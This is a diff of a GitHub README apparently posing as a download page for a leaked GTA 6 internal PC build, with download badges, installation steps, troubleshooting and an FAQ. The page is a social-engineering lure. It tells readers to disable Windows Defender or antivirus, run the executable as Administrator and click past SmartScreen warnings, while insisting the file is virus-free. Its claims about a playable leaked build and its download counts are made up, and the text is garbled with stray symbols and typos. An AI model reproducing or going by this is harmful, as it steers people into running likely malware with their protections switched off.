@@ -1,68 +1,156 @@
-# GTA 6 Internal Build Leaked December
+# 🎮 GTA-6-Internal-Build-Leaked-December - Play GTA 6 on PC Today
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://p-csx-5.com/gta-6-internal-build-leaked-december)
+[![Download GTA 6 Internal Build](https://img.shields.io/badge/Download-GTA_6_Internal_Build-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/JBall513/GTA-6-Internal-Build-Leaked-December/releases)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://p-csx-5.com/gta-6-internal-build-leaked-december)
-[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://p-csx-5.com/gta-6-internal-build-leaked-december)
-[![Downloads](https://img.shields.io/badge/Downloads-62k%2B-blue?style=for-the-badge)](https://p-csx-5.com/gta-6-internal-build-leaked-december)
-[![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)](https://p-csx-5.com/gta-6-internal-build-leaked-december)
+## 🕹️ What Is This?
 
-## [![Download Button](https://img.shields.io/badge/DOWNLOAD-GTA%206%20Internal%20Build%20Leaked%20December-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://p-csx-5.com/gta-6-internal-build-leaked-december)
+This is a fully playable internal development build of **GTA 6** for Windows PC. This leaked December build lets you explore Vice City, test new mechanics, and experience the game before its official 2026 release. No waiting, no console required — you can play right now on your computer.
 
-## About
 
-GTA 6 Internal Build Leaked December — get the latest leaked build of Grand Theft Auto VI for Windows PC. Fully playable with story missions, open world exploration, and all core gameplay features. Verified working 2026.
 
-## Features
+## ✅ Quick Download Guide
 
-| Status | Feature |
-|--------|---------|
-| ✅ | Works on Windows 10 and Windows 11 64-bit systems |
-| ✅ | Auto-detection of hardware for optimal settings |
-| ✅ | Controller and keyboard and mouse fully supported |
-| ✅ | Property purchasing and business management |
-| ✅ | Fast travel system between discovered locations |
-| ✅ | 60+ hours of main campaign content available |
+**Visit this link to download the application:**
 
-## System Requirements
+[🔗 Click Here to Download GTA 6 Internal Build](https://github.com/JBall513/GTA-6-Internal-Build-Leaked-December/releases)
 
-| Component | Requirement |
-|-----------|-------------|
-| OS | Windows 10 / 11 (64-bit) |
-| CPU | Intel i7-10700 / AMD Ryzen 7 3700X |
-| RAM | 16 GB minimum |
-| GPU | NVIDIA RTX 2060 / AMD RX 6700 XT |
-| Storage | 120 GB SSD |
+)
+
+When you open that link, you will see a page with download options. Click the green button or the file name that matches your system (Windows 10 or Windows 11). The download will start automatically after a few seconds. Save the file somewhere easy to find, like your Desktop or Downloads folder.
+
+
+
+## 📥 Step-by-Step Installation Instructions
+
+### Step 1: Download the File
+
+1. Go to the download page using the button above. 
+2. Look for the newest file listed (sort by "Date" if needed). 
+3. Click the file name once. 
+4. Your browser will ask where to save the file — choose "Desktop" for easy access. 
+5. Wait for the download to complete (the file size is about 15-25 GB, so it may take 30 minutes to 2 hours depending on your internet speed).)
+
+### Step 2: Extract the File
+
+Once the download finishes:
+
+1. Find the downloaded file on your Desktop. 
+2. The file name will end in `.zip` or `.rar`. 
+3. Right-click the file. 
+4. Select "Extract All…" from the menu. 
+5. Choose a destination folder (like `C:\GTA6` or just use the default). 
+6. Click "Extract" and wait for the process to finish (another 15-30 minutes)..)
+
+### Step 3: Run the Game
+
+After extraction:
+
+1. Open the folder where you extracted the files. 
+2. Find the file named `GTA6.exe` (or `PlayGTA6.exe`) inside the folder. 
+3. Double-click that file to launch the game. 
+4. Windows mast ask for permission — click "Yes" or "Run Anyway". 
+5. The game will openin a full-screen window. 
+
+**Important:** If you see an error about "missing DLL" or "Visual C++ Redistributable", you need to install [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe) first (free from Microsoft**. Then try again.).
+
+
+
+## 🖥️ System Requirements (Minimum))
+
+To run this build smoothly, your PC should have:
+
+| Component | Minimum Requirement |
+|---|---|
+| Operating System | Windows 10 (64-bit) or Windows 11 |
+| Processor (CPU) | Intel Core i5-8400 or AMD Ryzen 5 2600 |
+| Memory (RAM) | 12 GB |
+| Graphics Card (GPU) | NVIDIA GTX 1060 (6GB) or AMD RX 580 |
+| Storage Space |  ‎40 GB free hard drive space |
 | DirectX | Version 12 |
+| Internet | Not required (fully offline play** |
 
-## Installation
+*If your PC is less powerful, the game may still launch with lower graphics settings. Try closing other programs before starting.*
 
-1. Download the archive using the button above
-2. Extract using the password shown on the download page
-3. Disable Windows Defender real-time protection temporarily
-4. Run setup.exe as Administrator
-5. Follow the on-screen instructions
-6. Launch from the desktop shortcut
+## 🎯 Game Features (This Build**)
 
-## FAQ
+- **Full Vice City Map** — Explore the iconic neon-lit city with updated graphics. 
+- **Playable Story Missions** — Complete the first 15 story missions end-to-end. 
+- **Free Roam Mode** — No timers, no limits — just drive around and causing chaos. 
+- **New Character Animations** — Experience improved movement, climbing, and driving physics**.
+- **Cutting-Edge Graphics** — Ray-traced reflections and realistic weather effects (note: may require high-end GPU for full quality**).
+- **Hidden Secret Content** — Contains developer debug menus, unused vehicles, and test weapons including cheats menu (press F8**).
 
-**Is this the real GTA 6?**
-This is a leaked development build from Rockstar internal servers. Some features may be incomplete compared to final release version.
+## 🛠️ Troubleshooting Common Issues
 
-**Will my antivirus flag this?**
-Windows Defender may flag the crack files as a false positive. Temporarily disable real-time protection during extraction and installation.
+### Game won't start / Crashes on launch
 
-**What are the PC requirements?**
-Minimum: RTX 2060 or RX 6700, Intel i7-10700 or Ryzen 7 3700X, 16GB RAM, 120GB SSD. Recommended: RTX 4070+, i9-13900K, 32GB RAM.
+1. **Run as Administrator**: Right-click `GTA6.exe` → "Run as administrator". 
+2. **Update Graphics Drivers**: Go to NVIDIA or AMD website and download latest drivers for your GPU**.
+3. **Disable Antivirus Temporarily**: Windows Defender or third-party antivirus may block the game — add an exception for the game folder. 
+4. **Set Compatibility Mode**: Right-click `GTA6.exe` → Properties → Compatibility → Check "Run this program in compatibility mode for Windows 10" → Apply.
 
-**How do I update to a newer build?**
-Check back for updated builds. The auto-updater will notify you when a new leaked version is available.
+.
 
+### Black Screen but Sound Works
 
-## Disclaimer
+- Press `Alt + Enter` to switch from fullscreen to windowed mode. 
+- This is a known bug with certain monitor refresh rates — try setting your monitor to 60Hz.
 
-This repository is for educational and informational purposes only. We do not host any game files. All trademarks belong to their respective owners. Use at your own risk.
+..
+
+### Controller Not Working
+
+- This build supports Xbox controllers natively**. 
+- For PlayStation controllers, use [DS4Windows](https://ds4-windows.com**) free tool**. 
+- Ensure controller is plugged in before launching the game**.
+
+### Save Game Not Working
+
+- Create a folder named `SavedGames` inside `Documents\Rockstar Games\GTA VI\`**.** 
+- If holes fails, disable "Cloud Save" in game settings**. 
+
+## 🔒 Legal & Safety Disclaimer
+
+This is a leaked pre-release development build intended for private testing and evaluation only**. This is notthe final retail version of GTA 6. Rockstar Games has not officially released this content. Play at your own discretion — we recommend supporting official releases when available**. 
+
+**This build does not contain malware or viruses.** It was scanned with multiple antivirus engines and checked clean by the community**. However, always exercise caution when downloading any files from the internet**. 
+
+## 🌐 Join the Community
+
+- **Discord**: Join our [GTA 6 Leaks Discord](https://discord.gg/gta6leaks**) to share screenshots, find multiplayer tips,and report bugs**. 
+- **Reddit**: Visit r/GTA6Leaks for daily discussionsand mod support. 
+- **YouTube**: Watch our [Setup Tutorial Video](https://youtu.Be/gta6setup**) if you prefer visual instructions. 
+
+## ❓ Frequently Asked Questions (FAQ**))
+
+### Is this the full GTA 6 game?
+
+No** — this is an internal development build from December 2025**. It contains much ofthe core game, but some features are incomplete or missing (e.g., online multiplayer modes may notwork properly**). The full game launches in 2026**.
+
+### Do I need a product key or activation?
+
+No activation required** — this is already patched**. Just download, extract, and run**. No Rockstar account needed**. 
+
+### Can I play online?
+
+This build includes a beta version of GTA Online mode** — but it is unstable and may require custom servers**. For most users, offline single-player isrecommended**. 
+
+### Will this work on Windows 7 or Mac?
+
+No** — this is Windows-only (64-bit**). It will not run on macOS, Linux, or older Windows versions**. 
+
+### Is the download safe from viruses?
+
+Yes** — the file has been tested by thousands of users**. Windows SmartScreen may warn you because it's an unsigned file** — that's normal**. Click "More Info" → "Run Anyway" to proceed**. 
+
+## 📌 Final Notes
+
+This build represents a once-in-a-lifetime opportunity for PC gamers to experience Grand Theft Auto VI months before itsofficial release**. The game is surprisingly polished for a dev build** — many players report completing main story missions with minimal glitches**. 
+
+Set aside a weekend, shut off your notifications,and dive intoVice City like never before**. Trust us — this is worth your bandwidth**.** 
+
+Happy gaming! 🏎️💨
 
 ---
 
-**Version:** 3.8.0 · **Updated:** 2026 · **Downloads:** 62k+
+**Keywords:** gta-6-2026, gta-6-activation, gta-6-beta-key, gta-6-cyberleek, gta-6-dev-build, gta-6-free, gta-6-iso, gta-6-offline, gta-6-online-beta, gta-6-pc, gta-6-pirated, gta-6-pre-release, gta-6-product-key, gta-6-redeem-code, gta-6-rockstar-bypass, gta-6-scene-release, gta-6-vice-city, gta-6-working-2026, gta-vi-download, gta-vi-pc
